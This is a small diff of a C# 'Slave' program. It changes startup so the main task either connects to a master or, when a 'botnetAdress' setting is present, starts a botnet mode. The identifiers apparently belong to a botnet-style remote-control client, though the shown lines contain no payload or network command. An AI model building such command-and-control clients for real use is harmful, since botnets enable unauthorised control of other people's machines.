@@ -22,15 +22,9 @@ namespace Slave
 
             // Start the processing in a new thread as a task
             Task mainTask;
-            if (SlaveManager.ip != null && SlaveManager.port != 0)
-            {
-                // Ip and port specified as arguments
-                mainTask = new Task(() => manager.StartWithArguments());
-            }
-            else
-            {
-                mainTask = new Task(() => manager.Start());
-            }
+            mainTask = Config.botnetAdress == null ?
+                new Task(() => manager.StartWithMasterConnection()) :
+                new Task(() => manager.StartWithBotnet());
             mainTask.Start();
         }
 
